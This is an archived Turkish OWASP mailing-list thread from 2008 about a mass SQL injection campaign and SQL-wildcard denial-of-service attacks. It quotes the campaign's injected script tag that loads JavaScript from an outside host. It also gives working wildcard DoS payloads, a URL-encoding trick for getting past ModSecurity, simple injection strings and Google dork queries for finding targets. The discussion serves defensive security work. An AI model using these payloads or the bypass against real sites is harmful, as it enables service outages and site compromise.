From denizcev at gmail.com  Mon May 12 05:11:16 2008
From: denizcev at gmail.com (Deniz CEVIK)
Date: Mon, 12 May 2008 11:11:16 +0200
Subject: [Owasp-turkey] SQL Injection kullanan WORM'lar
Message-ID: <a7c1c0070805120211u17f5180bo474b09780b7c2757@mail.gmail.com>

Selamalar,

Son iki haftad?r 4-5 yerden siteleri de?i?tirildi?ine dair ?ikayetler
geldi. Sunucu loglar?n? detayl? inceledi?imde ayn? SQL injection
pattern'i ile kar??la?t?k. SQL injectioni inceleyince t?m sistem
tablolar?na a?a??daki gibi bir kay?tlar ekledi?i anla??l?yor. Olduk?a
zararl? bir kod. Sql injection a???? bulunan sitelere banner ekleyerek
para kazanmay? ama?layan sald?r?lar ve ?o?u ?in k?kenli.

</title></pre>"><script src=http://1.hao929.cn/ads.js></script><!--

http://isc.incidents.org/diary.html?storyid=4393

From huzeyfe at lifeoverip.net  Mon May 12 06:18:53 2008
From: huzeyfe at lifeoverip.net (Huzeyfe ONAL)
Date: Mon, 12 May 2008 13:18:53 +0300
Subject: [Owasp-turkey] SQL Injection kullanan WORM'lar
In-Reply-To: <a7c1c0070805120211u17f5180bo474b09780b7c2757@mail.gmail.com>
References: <a7c1c0070805120211u17f5180bo474b09780b7c2757@mail.gmail.com>
Message-ID: <4828198D.3050106@lifeoverip.net>

Selamlar,

benzer turde wormu -yontemi ayni, arac ve amaclar degisik- bir aydir 
farkli sekilde ben ilgiyle izliyorum*. Sadece MSSQL'i i ilgilendirse de 
Mysql kullanan sistemlerin loglarinda da denemeleri goruyoruz.


Aslinda bu son worm hadisesi  web tarafinin guvenligini -sayfa icerigi 
degistirilmedikce(deface)- cok dikkate  almayan sirket yoneticilerini 
biraz daha ikna etmis oldu.

*http://blog.lifeoverip.net/index.php/2008/04/30/son-gunlerin-seri-sql-injection-saldirilarina-dair/

Deniz CEVIK wrote:
> Selamalar,
> 
> Son iki haftad?r 4-5 yerden siteleri de?i?tirildi?ine dair ?ikayetler
> geldi. Sunucu loglar?n? detayl? inceledi?imde ayn? SQL injection
> pattern'i ile kar??la?t?k. SQL injectioni inceleyince t?m sistem
> tablolar?na a?a??daki gibi bir kay?tlar ekledi?i anla??l?yor. Olduk?a
> zararl? bir kod. Sql injection a???? bulunan sitelere banner ekleyerek
> para kazanmay? ama?layan sald?r?lar ve ?o?u ?in k?kenli.
> 
> </title></pre>"><script src=http://1.hao929.cn/ads.js></script><!--
> 
> http://isc.incidents.org/diary.html?storyid=4393
> _______________________________________________
> Owasp-turkey mailing list
> Owasp-turkey at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-turkey

From urgunb at hotmail.com  Thu May 15 03:19:23 2008
From: urgunb at hotmail.com (Bedirhan Urgun)
Date: Thu, 15 May 2008 03:19:23 -0400
Subject: [Owasp-turkey] SQL Injection kullanan WORM'lar
In-Reply-To: <4828198D.3050106@lifeoverip.net>
References: <a7c1c0070805120211u17f5180bo474b09780b7c2757@mail.gmail.com>
	<4828198D.3050106@lifeoverip.net>
Message-ID: <BAY104-W4612A752275A81464F4537D6C90@phx.gbl>

 
Merhaba,
Bu saldirilar bir worm seklinde midir bilmiyorum ama kesin bisey soylemek guc tabi. Gecen ay ve bu ay "massive sql injection" basligi altinda raporlar, haberler cikmisti. Ilgili saldirilarin (hatta saldiriyi yapmak icin kullanilan Cin kaynakli uygulamanin) analizini asagidaki linkten okumustum.
 
http://isc.sans.org/diary.html?n&storyid=4294
 
Kisaca uygulama, kurbanlarini google kullanarak asp sayfalarindan ve bu sayfalarda a parametresi (URL'de olunca tabi insanin aklina GET yerine POST kullanmanin hic de o kadar hafife alinmamasi gereken bi teknik/oneri oldugu geliyor) kullananlardan seciyormus. Google'dan arattim;
 
inurl:.asp inurl:a=
 
ve 3,220,000 sonuc cikti. Bunlardan 10,000'i 20,000'i hacklenmis cok mu? :P (Bu a isminin bi sihri var herhaldeki bu kadar gelistirici kullanmis) Yanliz
 
inurl:.asp inurl:b=
 
sorgusu 5,560,000 sonuc veriyor. Yani daha iyi (saldirgan acisindan). Hatta
 
inurl:.asp inurl:c=
 
sorgusu 14,100,000 sonuc veriyor. Yani belki de uygulamanin saldiramayacagi kadar fazla... 
 
bedirhan



> Date: Mon, 12 May 2008 13:18:53 +0300> From: huzeyfe at lifeoverip.net> To: owasp-turkey at lists.owasp.org> Subject: Re: [Owasp-turkey] SQL Injection kullanan WORM'lar> > Selamlar,> > benzer turde wormu -yontemi ayni, arac ve amaclar degisik- bir aydir > farkli sekilde ben ilgiyle izliyorum*. Sadece MSSQL'i i ilgilendirse de > Mysql kullanan sistemlerin loglarinda da denemeleri goruyoruz.> > > Aslinda bu son worm hadisesi web tarafinin guvenligini -sayfa icerigi > degistirilmedikce(deface)- cok dikkate almayan sirket yoneticilerini > biraz daha ikna etmis oldu.> > *http://blog.lifeoverip.net/index.php/2008/04/30/son-gunlerin-seri-sql-injection-saldirilarina-dair/> > Deniz CEVIK wrote:> > Selamalar,> > > > Son iki haftad?r 4-5 yerden siteleri de?i?tirildi?ine dair ?ikayetler> > geldi. Sunucu loglar?n? detayl? inceledi?imde ayn? SQL injection> > pattern'i ile kar??la?t?k. SQL injectioni inceleyince t?m sistem> > tablolar?na a?a??daki gibi bir kay?tlar ekledi?i anla??l?yor. Olduk?a> > zararl? bir kod. Sql injection a???? bulunan sitelere banner ekleyerek> > para kazanmay? ama?layan sald?r?lar ve ?o?u ?in k?kenli.> > > > </title></pre>"><script src=http://1.hao929.cn/ads.js></script><!--> > > > http://isc.incidents.org/diary.html?storyid=4393> > _______________________________________________> > Owasp-turkey mailing list> > Owasp-turkey at lists.owasp.org> > https://lists.owasp.org/mailman/listinfo/owasp-turkey> _______________________________________________> Owasp-turkey mailing list> Owasp-turkey at lists.owasp.org> https://lists.owasp.org/mailman/listinfo/owasp-turkey
_________________________________________________________________
Windows Live SkyDrive lets you share files with faraway friends.
http://www.windowslive.com/skydrive/overview.html?ocid=TXT_TAGLM_WL_Refresh_skydrive_052008
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080515/d2d795d8/attachment.html 

From ferruh at mavituna.com  Mon May 19 08:24:29 2008
From: ferruh at mavituna.com (Ferruh Mavituna)
Date: Mon, 19 May 2008 13:24:29 +0100
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
Message-ID: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>

Herkese Selamlar,

Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim, burada
da hem paylasmak hem de konu hakkinda fikir almak istedim.

Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer
sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.
Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor,
dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali
gerekli.

Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test
metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP
Guide da bu konuda bir seyler ekleyebiliriz.

Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:

http://www.portcullis-security.com/uplds/wildcard_attacks.pdf



Iyi Calismalar,

-- 
Ferruh Mavituna
http://ferruh.mavituna.com
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080519/006b12f7/attachment.html 

From denizcev at gmail.com  Tue May 20 07:36:18 2008
From: denizcev at gmail.com (Deniz CEVIK)
Date: Tue, 20 May 2008 13:36:18 +0200
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
Message-ID: <a7c1c0070805200436j5ed20e7bp6311c8d5a06da28e@mail.gmail.com>

Yaz?y? hen?z okuyamad?m ama ba?ar?l? bir ?al??ma oldu?una eminim. Sql
injection kullan?larak DoS, sald?r? tekni?i a??s?ndan olduk?a etkin
bir teknik. Tek bir istek ile sunucuyu tamamen cevap veremez duruma
getirmek m?mk?n olabiliyor. ?rne?in uygulama.asp?id=1 or 1=1 veya ' or
''=' gibi bir istek sorguya ba?l? olarak t?m kay?tlar?n g?r?nt?lenmeye
?al???lmas?na neden olabilir. ilgili sorguya uyan y?zbinlerce kay?t
olan bir sistemde basit bir istek rahatl?kla sistemlerin ve
servislerin hizmet d??? kalmas?na yol a?abilir.

Asl?nda bunlar? testlerimize eklemek iyi bir fikir olmayabilir.
Sunucunun cevap vermez duruma gelmesine neden olabiliriz. :)

?yi ?al??malar.

2008/5/19 Ferruh Mavituna <ferruh at mavituna.com>:
> Herkese Selamlar,
>
> Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim, burada
> da hem paylasmak hem de konu hakkinda fikir almak istedim.
>
> Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer
> sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.
> Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor,
> dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali
> gerekli.
>
> Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test
> metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP
> Guide da bu konuda bir seyler ekleyebiliriz.
>
> Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:
>
> http://www.portcullis-security.com/uplds/wildcard_attacks.pdf
>
>
>
> Iyi Calismalar,
>
> --
> Ferruh Mavituna
> http://ferruh.mavituna.com
> _______________________________________________
> Owasp-turkey mailing list
> Owasp-turkey at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-turkey
>
>

From mesut at h-labs.org  Tue May 20 07:46:56 2008
From: mesut at h-labs.org (Mesut Timur)
Date: Tue, 20 May 2008 11:46:56 +0000
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <a7c1c0070805200436j5ed20e7bp6311c8d5a06da28e@mail.gmail.com>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
	<a7c1c0070805200436j5ed20e7bp6311c8d5a06da28e@mail.gmail.com>
Message-ID: <BAY141-W136E35B2C757EF34CCB8339DC40@phx.gbl>


Aslinda makaledeki kasit injection kullanarak DoS yapmak degil de, daha cok SQL Wildcard'lari kullanarak DoS yapmak. Nitekim SQL Injection var ve DoS SQL Injection'dan kaynaklaniyorsa, DoS'u kaale almaya pek gerek yok :) (Makalenin sonlarina dogru oyle bir baslik da olacakti ama)

Mesut T?MUR 
http://www.h-labs.org 
GYTE Bilgisayar M?hendisli?i


> Date: Tue, 20 May 2008 13:36:18 +0200
> From: denizcev at gmail.com
> To: ferruh at mavituna.com
> CC: owasp-turkey at lists.owasp.org
> Subject: Re: [Owasp-turkey] DoS attacks using SQL Wildcards
> 
> Yaz?y? hen?z okuyamad?m ama ba?ar?l? bir ?al??ma oldu?una eminim. Sql
> injection kullan?larak DoS, sald?r? tekni?i a??s?ndan olduk?a etkin
> bir teknik. Tek bir istek ile sunucuyu tamamen cevap veremez duruma
> getirmek m?mk?n olabiliyor. ?rne?in uygulama.asp?id=1 or 1=1 veya ' or
> ''=' gibi bir istek sorguya ba?l? olarak t?m kay?tlar?n g?r?nt?lenmeye
> ?al???lmas?na neden olabilir. ilgili sorguya uyan y?zbinlerce kay?t
> olan bir sistemde basit bir istek rahatl?kla sistemlerin ve
> servislerin hizmet d??? kalmas?na yol a?abilir.
> 
> Asl?nda bunlar? testlerimize eklemek iyi bir fikir olmayabilir.
> Sunucunun cevap vermez duruma gelmesine neden olabiliriz. :)
> 
> ?yi ?al??malar.
> 
> 2008/5/19 Ferruh Mavituna <ferruh at mavituna.com>:
> > Herkese Selamlar,
> >
> > Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim, burada
> > da hem paylasmak hem de konu hakkinda fikir almak istedim.
> >
> > Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer
> > sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.
> > Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor,
> > dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali
> > gerekli.
> >
> > Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test
> > metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP
> > Guide da bu konuda bir seyler ekleyebiliriz.
> >
> > Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:
> >
> > http://www.portcullis-security.com/uplds/wildcard_attacks.pdf
> >
> >
> >
> > Iyi Calismalar,
> >
> > --
> > Ferruh Mavituna
> > http://ferruh.mavituna.com
> > _______________________________________________
> > Owasp-turkey mailing list
> > Owasp-turkey at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-turkey
> >
> >
> _______________________________________________
> Owasp-turkey mailing list
> Owasp-turkey at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-turkey

_________________________________________________________________
Keep your kids safer online with Windows Live Family Safety.
http://www.windowslive.com/family_safety/overview.html?ocid=TXT_TAGLM_WL_Refresh_family_safety_052008
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080520/95074383/attachment.html 

From ferruh at mavituna.com  Tue May 20 08:14:35 2008
From: ferruh at mavituna.com (Ferruh Mavituna)
Date: Tue, 20 May 2008 13:14:35 +0100
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <BAY141-W136E35B2C757EF34CCB8339DC40@phx.gbl>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
	<a7c1c0070805200436j5ed20e7bp6311c8d5a06da28e@mail.gmail.com>
	<BAY141-W136E35B2C757EF34CCB8339DC40@phx.gbl>
Message-ID: <6dc88c3c0805200514y2b4f6417v54e92d9380da1808@mail.gmail.com>

Evet makalede kisaca eger SQL Injection varsa neler yapilabilcegine degindim
ama o kadar cok yapilabilecek sey var ki mesela DROP members :) Super bir
DoS atagi!


Asl?nda bunlar? testlerimize eklemek iyi bir fikir olmayabilir.
>
Sunucunun cevap vermez duruma gelmesine neden olabiliriz. :)


:) Buradaki teknikte bundan pek korkmaya gerek yok cunku hemen hemen hic bir
sunucu bir defa bunu denemekten cokmeyecektir. Dolayiysiyla 2-3 istek
yapilip cevap suresu tespit edilebilir. Dolayisiyla production sistemlerinde
test etmekte bence sakinca yok.

2008/5/20 Mesut Timur <mesut at h-labs.org>:

>  Aslinda makaledeki kasit injection kullanarak DoS yapmak degil de, daha
> cok SQL Wildcard'lari kullanarak DoS yapmak. Nitekim SQL Injection var ve
> DoS SQL Injection'dan kaynaklaniyorsa, DoS'u kaale almaya pek gerek yok :)
> (Makalenin sonlarina dogru oyle bir baslik da olacakti ama)
>
> Mesut T?MUR
> *http://www.h-labs.org*<http://mail2web.com/cgi-bin/redir.asp?lid=0&newsite=http://www.h-labs.org>
> GYTE Bilgisayar M?hendisli?i
>
>
> > Date: Tue, 20 May 2008 13:36:18 +0200
> > From: denizcev at gmail.com
> > To: ferruh at mavituna.com
> > CC: owasp-turkey at lists.owasp.org
> > Subject: Re: [Owasp-turkey] DoS attacks using SQL Wildcards
>
> >
> > Yaz?y? hen?z okuyamad?m ama ba?ar?l? bir ?al??ma oldu?una eminim. Sql
> > injection kullan?larak DoS, sald?r? tekni?i a??s?ndan olduk?a etkin
> > bir teknik. Tek bir istek ile sunucuyu tamamen cevap veremez duruma
> > getirmek m?mk?n olabiliyor. ?rne?in uygulama.asp?id=1 or 1=1 veya ' or
> > ''=' gibi bir istek sorguya ba?l? olarak t?m kay?tlar?n g?r?nt?lenmeye
> > ?al???lmas?na neden olabilir. ilgili sorguya uyan y?zbinlerce kay?t
> > olan bir sistemde basit bir istek rahatl?kla sistemlerin ve
> > servislerin hizmet d??? kalmas?na yol a?abilir.
> >
> > Asl?nda bunlar? testlerimize eklemek iyi bir fikir olmayabilir.
> > Sunucunun cevap vermez duruma gelmesine neden olabiliriz. :)
> >
> > ?yi ?al??malar.
> >
> > 2008/5/19 Ferruh Mavituna <ferruh at mavituna.com>:
> > > Herkese Selamlar,
> > >
> > > Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim,
> burada
> > > da hem paylasmak hem de konu hakkinda fikir almak istedim.
> > >
> > > Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer
> > > sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu
> gosteriyor.
> > > Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor,
> > > dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem
> almali
> > > gerekli.
> > >
> > > Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test
> > > metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede
> OWASP
> > > Guide da bu konuda bir seyler ekleyebiliriz.
> > >
> > > Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:
> > >
> > > http://www.portcullis-security.com/uplds/wildcard_attacks.pdf
> > >
> > >
> > >
> > > Iyi Calismalar,
> > >
> > > --
> > > Ferruh Mavituna
> > > http://ferruh.mavituna.com
> > > _______________________________________________
> > > Owasp-turkey mailing list
> > > Owasp-turkey at lists.owasp.org
> > > https://lists.owasp.org/mailman/listinfo/owasp-turkey
> > >
> > >
> > _______________________________________________
> > Owasp-turkey mailing list
> > Owasp-turkey at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-turkey
>
> ------------------------------
> Keep your kids safer online with Windows Live Family Safety. Help protect
> your kids.<http://www.windowslive.com/family_safety/overview.html?ocid=TXT_TAGLM_WL_Refresh_family_safety_052008>
>



-- 
Ferruh Mavituna
http://ferruh.mavituna.com
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080520/3e1222c4/attachment.html 

From urgunb at hotmail.com  Tue May 20 09:42:55 2008
From: urgunb at hotmail.com (Bedirhan Urgun)
Date: Tue, 20 May 2008 09:42:55 -0400
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
Message-ID: <BAY104-W22026B70C99FE6E76B00C7D6C40@phx.gbl>

 merhaba,tebrik ederim Ferruh. 
 
Yazidaki teknik ile alakali olarak bugun Yusuf ?eri ile farkettigimiz bi noktayi paylasmak istedim. Eger modsecurity ile korunan sisteminiz (veya baska bir WAF), yazida belirtilen asagidaki payloadu reddiyorsa 
 
'%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}?$&N%_)$*?()$*R"_)][%](%[x])%a][$*"?$-9]_%' 
 
bu saldiriya acik degiliz anlamina gelmiyor. Yukaridaki payload'un basit bir bypass teknigi uygulanmis hali;
 
'%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}?$&N%55_)$*?()$*R"_)][%55](%66[x])%ba][$*"?$-9]_%54'
 
Yani payloaddaki % yerine gecerli bir url encoded karakter giriliyor (ascii 32'den buyuk olmasi daha iyi cunku 0-32 [non-printables] arasi reddediliyor olarak ayarlanmis olabilir ilgili WAF'da).
Peki arkada donen ne? modsec hatirladigim kadari ile "double encoding" saldirilarini engellemek icin aldigi input'u bir daha decode edip, URL denetimini bir daha gercekliyor. Ve boylece mesela
 
%a -> %25a -> modsec -> %25a (gecerli URL encoding) -> %a (gecersiz URL encoding) = istek reddedilir
 
ama by-pass teknigi ile
 
%aa -> %25aa -> modsec -> %25aa (gecerli URL encoding) -> %aa (gecerli URL ending) = istek onaylanir
 
 
bedirhan
 


Date: Mon, 19 May 2008 13:24:29 +0100From: ferruh at mavituna.comTo: owasp-turkey at lists.owasp.orgSubject: [Owasp-turkey] DoS attacks using SQL WildcardsHerkese Selamlar,Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim, burada da hem paylasmak hem de konu hakkinda fikir almak istedim. Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor, dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali gerekli.Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP Guide da bu konuda bir seyler ekleyebiliriz.Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:http://www.portcullis-security.com/uplds/wildcard_attacks.pdfIyi Calismalar,-- Ferruh Mavitunahttp://ferruh.mavituna.com 
_________________________________________________________________
E-mail for the greater good. Join the i?m Initiative from Microsoft.
http://im.live.com/Messenger/IM/Join/Default.aspx?source=EML_WL_ GreaterGood
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080520/aaa8ca37/attachment.html 

From ferruh at mavituna.com  Tue May 20 10:03:16 2008
From: ferruh at mavituna.com (Ferruh Mavituna)
Date: Tue, 20 May 2008 15:03:16 +0100
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <BAY104-W22026B70C99FE6E76B00C7D6C40@phx.gbl>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
	<BAY104-W22026B70C99FE6E76B00C7D6C40@phx.gbl>
Message-ID: <6dc88c3c0805200703m2ced3cc4j323eb2fee97e4a48@mail.gmail.com>

Merhabalar,

Tesekkurler Bedirhan, paylastiginiz nokta ilgincmis benim modsecurity hic
aklima gelmemisti o sirada. Ek olarak payload cok daha farkli sekillerde de
yapilabilir, senin gosterdigin ve buldugunuz yontem de bunun gibi.

Mesela benim gene dokumanda verdigim basit bir ornek var : _[r/a)_ _(r/b)_
_(r-d)_

Gayet kisa ve benim testimdeki bir web forum yaziliminda 30+ sn. suruyor
calismasi :), yazilim detaylarini burada veremiyorum, kendilerine de acik
olarak bildirdim zaten ama sadece durumun vehametini ortaya koymak adina. Bu
yazilimda mesela 15 karakter gibi bir limit vardi, ama ona ragment
yukaridaki basit arama yetti.

Bu arada karsimiza geldiginde bypass edebilmek icin bu double encoding
olayini akilda tutmak lazim.

2008/5/20 Bedirhan Urgun <urgunb at hotmail.com>:

>
>  merhaba,
> tebrik ederim Ferruh.
>
> Yazidaki teknik ile alakali olarak bugun Yusuf ?eri ile farkettigimiz bi
> noktayi paylasmak istedim. Eger modsecurity ile korunan sisteminiz (veya
> baska bir WAF), yazida belirtilen asagidaki payloadu reddiyorsa
>
> '%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}?$&N%_)$*?()$*R"_)][%](%[x])%a][$*"?$-9]_%'
>
>
> bu saldiriya acik degiliz anlamina gelmiyor. Yukaridaki payload'un basit
> bir bypass teknigi uygulanmis hali;
>
>
> '%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}?$&N%55_)$*?()$*R"_)][%55](%66[x])%ba][$*"?$-9]_%54'
>
> Yani payloaddaki % yerine gecerli bir url encoded karakter giriliyor (ascii
> 32'den buyuk olmasi daha iyi cunku 0-32 [non-printables] arasi reddediliyor
> olarak ayarlanmis olabilir ilgili WAF'da).
>
> Peki arkada donen ne? modsec hatirladigim kadari ile "double encoding"
> saldirilarini engellemek icin aldigi input'u bir daha decode edip, URL
> denetimini bir daha gercekliyor. Ve boylece mesela
>
> %a -> %25a -> modsec -> %25a (gecerli URL encoding) -> %a (*gecersiz *URL
> encoding) = istek reddedilir
>
> ama by-pass teknigi ile
>
> %aa -> %25aa -> modsec -> %25aa (gecerli URL encoding) -> %aa (*gecerli *URL
> ending) = istek onaylanir
>
>
> bedirhan
>
> ------------------------------
> Date: Mon, 19 May 2008 13:24:29 +0100
> From: ferruh at mavituna.com
> To: owasp-turkey at lists.owasp.org
> Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
>
>
> Herkese Selamlar,
>
> Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim,
> burada da hem paylasmak hem de konu hakkinda fikir almak istedim.
>
> Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer
> sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.
> Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor,
> dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali
> gerekli.
>
> Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test
> metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP
> Guide da bu konuda bir seyler ekleyebiliriz.
>
> Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:
>
> http://www.portcullis-security.com/uplds/wildcard_attacks.pdf
>
>
>
> Iyi Calismalar,
>
> --
> Ferruh Mavituna
> http://ferruh.mavituna.com
>
> ------------------------------
> E-mail for the greater good. Join the i'm Initiative from Microsoft.<http://im.live.com/Messenger/IM/Join/Default.aspx?source=EML_WL_+GreaterGood>
>



-- 
Ferruh Mavituna
http://ferruh.mavituna.com
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080520/f6f73095/attachment.html 

From urgunb at hotmail.com  Thu May 22 03:26:39 2008
From: urgunb at hotmail.com (Bedirhan Urgun)
Date: Thu, 22 May 2008 03:26:39 -0400
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <6dc88c3c0805200703m2ced3cc4j323eb2fee97e4a48@mail.gmail.com>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
	<BAY104-W22026B70C99FE6E76B00C7D6C40@phx.gbl> 
	<6dc88c3c0805200703m2ced3cc4j323eb2fee97e4a48@mail.gmail.com>
Message-ID: <BAY104-W12F97CB890B58CA2FE0042D6C60@phx.gbl>

Merhaba,
Dun ve bugun test ettigimiz sistemlerde, Ferruh'un makalesindeki teknikleri denedik.
Yazida da belirttigi gibi en onemli nokta "denemek". Cunku her payload (sorgu bolumu) her durumda iyi sonuclar vermiyor. Yeni bi tane bulmak gerekebiliyor. Mesela bi sayfada asagidaki yeni payload tek istekte ~20sn tutuyor, character negation trick ;)
 
%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
 
Ama onemli olan bi nokta daha var. Aramanin hangi field'lar da yapildigi. Mesela metin (text, blob) sutunlarda arama yapiliyorsa yukaridaki gecerli. Sadece varchar(~50) gibi sutunlarda arama yapan yerlerde (ASP.NET->MSSQL) bu teknikleri kararli kullanamadim simdiye kadar. Hatta bu farkliliga gore bile payloadlar degistirilebilir. Belki fuzzer gibi bisey kullanmak lazim.bedirhan


Date: Tue, 20 May 2008 15:03:16 +0100From: ferruh at mavituna.comTo: urgunb at hotmail.comSubject: Re: [Owasp-turkey] DoS attacks using SQL WildcardsCC: owasp-turkey at lists.owasp.orgMerhabalar, Tesekkurler Bedirhan, paylastiginiz nokta ilgincmis benim modsecurity hic aklima gelmemisti o sirada. Ek olarak payload cok daha farkli sekillerde de yapilabilir, senin gosterdigin ve buldugunuz yontem de bunun gibi.Mesela benim gene dokumanda verdigim basit bir ornek var : _[r/a)_ _(r/b)_ _(r-d)_ Gayet kisa ve benim testimdeki bir web forum yaziliminda 30+ sn. suruyor calismasi :), yazilim detaylarini burada veremiyorum, kendilerine de acik olarak bildirdim zaten ama sadece durumun vehametini ortaya koymak adina. Bu yazilimda mesela 15 karakter gibi bir limit vardi, ama ona ragment yukaridaki basit arama yetti.Bu arada karsimiza geldiginde bypass edebilmek icin bu double encoding olayini akilda tutmak lazim.
2008/5/20 Bedirhan Urgun <urgunb at hotmail.com>:

 merhaba,tebrik ederim Ferruh.  Yazidaki teknik ile alakali olarak bugun Yusuf ?eri ile farkettigimiz bi noktayi paylasmak istedim. Eger modsecurity ile korunan sisteminiz (veya baska bir WAF), yazida belirtilen asagidaki payloadu reddiyorsa  '%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}?$&N%_)$*?()$*R"_)][%](%[x])%a][$*"?$-9]_%'  bu saldiriya acik degiliz anlamina gelmiyor. Yukaridaki payload'un basit bir bypass teknigi uygulanmis hali; '%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}?$&N%55_)$*?()$*R"_)][%55](%66[x])%ba][$*"?$-9]_%54' Yani payloaddaki % yerine gecerli bir url encoded karakter giriliyor (ascii 32'den buyuk olmasi daha iyi cunku 0-32 [non-printables] arasi reddediliyor olarak ayarlanmis olabilir ilgili WAF'da).Peki arkada donen ne? modsec hatirladigim kadari ile "double encoding" saldirilarini engellemek icin aldigi input'u bir daha decode edip, URL denetimini bir daha gercekliyor. Ve boylece mesela %a -> %25a -> modsec -> %25a (gecerli URL encoding) -> %a (gecersiz URL encoding) = istek reddedilir ama by-pass teknigi ile %aa -> %25aa -> modsec -> %25aa (gecerli URL encoding) -> %aa (gecerli URL ending) = istek onaylanir  bedirhan 

Date: Mon, 19 May 2008 13:24:29 +0100From: ferruh at mavituna.comTo: owasp-turkey at lists.owasp.orgSubject: [Owasp-turkey] DoS attacks using SQL Wildcards


